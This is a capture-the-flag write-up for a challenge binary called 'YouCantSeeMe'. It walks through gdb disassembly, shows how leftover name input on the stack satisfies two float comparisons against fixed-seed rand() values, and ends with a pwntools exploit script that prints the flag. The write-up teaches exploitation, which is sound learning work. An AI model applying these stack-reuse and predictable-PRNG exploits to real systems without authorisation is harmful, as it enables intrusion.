# Writeup

* Disassembling main in gdb

```bash
gdb > disass main
   0x0000131b <+0>:     push   ebp
   0x0000131c <+1>:     mov    ebp,esp
   0x0000131e <+3>:     and    esp,0xfffffff0
   0x00001321 <+6>:     call   0x133c <__x86.get_pc_thunk.ax>
   0x00001326 <+11>:    add    eax,0x2cda
   0x0000132b <+16>:    call   0x12a9 <get_name>
   0x00001330 <+21>:    call   0x11ed <login>
   0x00001335 <+26>:    mov    eax,0x0
   0x0000133a <+31>:    leave
   0x0000133b <+32>:    ret
```

We see that it is calling two functions `get_name` and `login` with
no arguments. Now dissassembling those function , we see

`get_name` disassembly

```
gdb > disass get_name
   0x000012a9 <+0>:     push   ebp
   0x000012aa <+1>:     mov    ebp,esp
   0x000012ac <+3>:     push   ebx
   0x000012ad <+4>:     sub    esp,0x74
   0x000012b0 <+7>:     call   0x10f0 <__x86.get_pc_thunk.bx>
   0x000012b5 <+12>:    add    ebx,0x2d4b
   0x000012bb <+18>:    mov    eax,gs:0x14
   0x000012c1 <+24>:    mov    DWORD PTR [ebp-0xc],eax
   0x000012c4 <+27>:    xor    eax,eax
   0x000012c6 <+29>:    sub    esp,0xc
   0x000012c9 <+32>:    lea    eax,[ebx-0x1fea]
   0x000012cf <+38>:    push   eax
   0x000012d0 <+39>:    call   0x1040 <printf@plt>
   0x000012d5 <+44>:    add    esp,0x10
   0x000012d8 <+47>:    sub    esp,0x8
   0x000012db <+50>:    lea    eax,[ebp-0x70]
   0x000012de <+53>:    push   eax
   0x000012df <+54>:    lea    eax,[ebx-0x1fdc]
   0x000012e5 <+60>:    push   eax
   0x000012e6 <+61>:    call   0x10a0 <__isoc99_scanf@plt>
   0x000012eb <+66>:    add    esp,0x10
   0x000012ee <+69>:    sub    esp,0x8
   0x000012f1 <+72>:    lea    eax,[ebp-0x70]
   0x000012f4 <+75>:    push   eax
   0x000012f5 <+76>:    lea    eax,[ebx-0x1fd6]
   0x000012fb <+82>:    push   eax
   0x000012fc <+83>:    call   0x1040 <printf@plt>
   0x00001301 <+88>:    add    esp,0x10
   0x00001304 <+91>:    nop
   0x00001305 <+92>:    mov    eax,DWORD PTR [ebp-0xc]
   0x00001308 <+95>:    sub    eax,DWORD PTR gs:0x14
   0x0000130f <+102>:   je     0x1316 <get_name+109>
   0x00001311 <+104>:   call   0x13c0 <__stack_chk_fail_local>
   0x00001316 <+109>:   mov    ebx,DWORD PTR [ebp-0x4]
   0x00001319 <+112>:   leave
   0x0000131a <+113>:   ret
```

`login` disassembly

```bash
gdb > disass login
   0x000011ed <+0>:     push   ebp
   0x000011ee <+1>:     mov    ebp,esp
   0x000011f0 <+3>:     push   ebx
   0x000011f1 <+4>:     sub    esp,0x34
   0x000011f4 <+7>:     call   0x10f0 <__x86.get_pc_thunk.bx>
   0x000011f9 <+12>:    add    ebx,0x2e07
   0x000011ff <+18>:    mov    eax,gs:0x14
   0x00001205 <+24>:    mov    DWORD PTR [ebp-0xc],eax
   0x00001208 <+27>:    xor    eax,eax
   0x0000120a <+29>:    sub    esp,0xc
   0x0000120d <+32>:    push   0x0
   0x0000120f <+34>:    call   0x1070 <srand@plt>
   0x00001214 <+39>:    add    esp,0x10
   0x00001217 <+42>:    call   0x1090 <rand@plt>
   0x0000121c <+47>:    sub    esp,0xc
   0x0000121f <+50>:    push   eax
   0x00001220 <+51>:    call   0x1070 <srand@plt>
   0x00001225 <+56>:    add    esp,0x10
   0x00001228 <+59>:    call   0x1090 <rand@plt>
   0x0000122d <+64>:    movzx  eax,ax
   0x00001230 <+67>:    mov    DWORD PTR [ebp-0x2c],eax
   0x00001233 <+70>:    fild   DWORD PTR [ebp-0x2c]
   0x00001236 <+73>:    fstp   DWORD PTR [ebp-0x1c]
   0x00001239 <+76>:    call   0x1090 <rand@plt>
   0x0000123e <+81>:    movzx  eax,ax
   0x00001241 <+84>:    mov    DWORD PTR [ebp-0x2c],eax
   0x00001244 <+87>:    fild   DWORD PTR [ebp-0x2c]
   0x00001247 <+90>:    fstp   DWORD PTR [ebp-0x18]
   0x0000124a <+93>:    lea    eax,[ebp-0x14]
   0x0000124d <+96>:    fld    DWORD PTR [eax]
   0x0000124f <+98>:    fld    DWORD PTR [ebp-0x1c]
   0x00001252 <+101>:   fucomip st,st(1)
   0x00001254 <+103>:   jp     0x1288 <login+155>
   0x00001256 <+105>:   fld    DWORD PTR [ebp-0x1c]
   0x00001259 <+108>:   fucomip st,st(1)
   0x0000125b <+110>:   fstp   st(0)
   0x0000125d <+112>:   jne    0x128e <login+161>
   0x0000125f <+114>:   lea    eax,[ebp-0x10]
   0x00001262 <+117>:   fld    DWORD PTR [eax]
   0x00001264 <+119>:   fld    DWORD PTR [ebp-0x18]
   0x00001267 <+122>:   fucomip st,st(1)
   0x00001269 <+124>:   jp     0x128c <login+159>
   0x0000126b <+126>:   fld    DWORD PTR [ebp-0x18]
   0x0000126e <+129>:   fucomip st,st(1)
   0x00001270 <+131>:   fstp   st(0)
   0x00001272 <+133>:   jne    0x128e <login+161>
   0x00001274 <+135>:   sub    esp,0xc
   0x00001277 <+138>:   lea    eax,[ebx-0x1ff8]
   0x0000127d <+144>:   push   eax
   0x0000127e <+145>:   call   0x1060 <system@plt>
   0x00001283 <+150>:   add    esp,0x10
   0x00001286 <+153>:   jmp    0x128e <login+161>
   0x00001288 <+155>:   fstp   st(0)
   0x0000128a <+157>:   jmp    0x128e <login+161>
   0x0000128c <+159>:   fstp   st(0)
   0x0000128e <+161>:   mov    eax,0x0
   0x00001293 <+166>:   mov    edx,DWORD PTR [ebp-0xc]
   0x00001296 <+169>:   sub    edx,DWORD PTR gs:0x14
   0x0000129d <+176>:   je     0x12a4 <login+183>
   0x0000129f <+178>:   call   0x13c0 <__stack_chk_fail_local>
   0x000012a4 <+183>:   mov    ebx,DWORD PTR [ebp-0x4]
   0x000012a7 <+186>:   leave
   0x000012a8 <+187>:   ret
```

We can see that the get_name function takes in some input. And we can calculate its size
easily as `0x70 - 0xc` which comes out to be 100. We can tell the buffer ends at 0xc because 
at 0xc gs:0x14 value is placed to detect buffer overflow which is not actually possible here because of the use of %100s in printf (we can see this from strings command as well). But we
see that nothing much is done with that input. Its just prints to the screen. Nothing else.

Now if we take a look at the login function, we see that it is dealing with some floats. There 
are `fld,fstp,fucomip` and we also see `rand` and `srand` getting called. The srand function 
has a fixed seed of `0`. And right after that there's another `srand` call with argument
being result of `rand`. Since the first srand seed was constand , the value generated by
the `rand()` which is the argument of  second `srand` is going to generate the same value
always. So the second `srand` is also technically being called with a constant.


So our `rand` calls are always going to generate the same values no matter how many times we run it. Also after every call to `rand` there
seems to be some instructions , its only taking the rightmost 16 bits of the value
generated by rand() (with `movzx eax , ax`).

Our focus is at `fld,fstp` instructions. The `fld` instruction loads some data onto the stack from a 
particular place and the `fstp` instruction is popping that pushed value to location
`$ebp-0x1c` after the first `rand` call and its storing the result of that `rand` function call after doing and with `0xffff`(`movzx eax,ax` does this) . Also similarly at `$ebp-0x18` there's another random value stored.


Right after the instruction at `<+145>` in login disassembly, which stores a float, we see the address
`$ebp-0x14` being loaded to `$eax` with lea instruction. And the value at that address is
loaded as a float by `fld` instruction. **But we never really wrote anything to `$ebp-0x14`**.
After that `$ebp-0x1c` is loaded. We see a `fucomip st,st(1)` instruction after that which 
is basically comparing the the last two float values that were pushed onto the stack and 
this instructions also pops off the top value `st or st(0)` which in this case is `$ebp-0x1c`
. This instruction sets flags PF,CF and ZF based on the comparision. And we see a parity 
check being done with `jp` instruction. After that again `$ebp-0x1c` is loaded and we 
see another `fucomip` instruction and this time it was done to check for equality,evident by 
the `jne` instruction. Now we see the same set of instructions being performed on
`$ebp-0x10` and `$ebp-0x18`. And failing any of the comparisions would cause the program to
jump to the same place. So it can be concluded from this that there was two floating point
equality checks between `$ebp-0x1c and $ebp-0x14` and `$ebp-0x18 and $ebp-0x10`. If both 
checks are passed then only we get to out flag(with the `system` function call with "/bin/cat flag").

**But we never really gave any values for `$ebp-0x14` and `$ebp-0x10` inside the `login` function**, that means that the input
given in `get_name` function is supposed to satisfy these equality checks done with the random
values generated. This happens because of how stacks are used. When we return from a function
call, the values written there arent cleared. They just stay there until they're overwritten
by some other function. So the input that we gave in `get_name` sticks around in the call
to `login`. Some portions of it are overwritten by that functions local variables but
not all the values got overwritten. So we just put appropriate values in `$ebp-0x14` and
`$ebp-0x10` and boom we get our flag. 

We can easily find out what values were put in $ebp-0x1c and $ebp-0x18(by the `rand` calls) by stopping 
the execution with gdb and examining these two places inside the `login` function call.

Now the input in `get_name` call is 100 characters(from $ebp-0x70 -> $ebp-0xc) we need to
carefully put the last 8 characters so that it passes the comparisions. 92 - 96 characters will
go to `$ebp-0x14` and 96-100 will go to `$ebp-0x10`. Now we just give an input that will pass
the tests and we have our flag.

After examining by running local binary in gdb, we see that the `$ebp-0x1c = 9662.0 = 0x4616f800` and `$ebp-0x18 = 43738.0 = 0x472ada00`

Now making exploit for it with pwntools, we'd have to do something like this

```python
from pwn import *
import struct

def f(a:int) -> bytes:
    return struct.pack('i',a)

def main():
   # host = 'host'
   # port = 'port'
   #  p = remote(host,port,timeout=None)
    p = process('./YouCantSeeMe') # when run locally
    # Found with gdb
    ebp1cVal = 0x4616f800
    ebp18Val = 0x472ada00
    print(p.recvuntil('Your name? : ').decode())
    p.sendline(("A"*92).encode() + f(ebp1cVal) + f(ebp18Val) )
    p.interactive()

main()
```
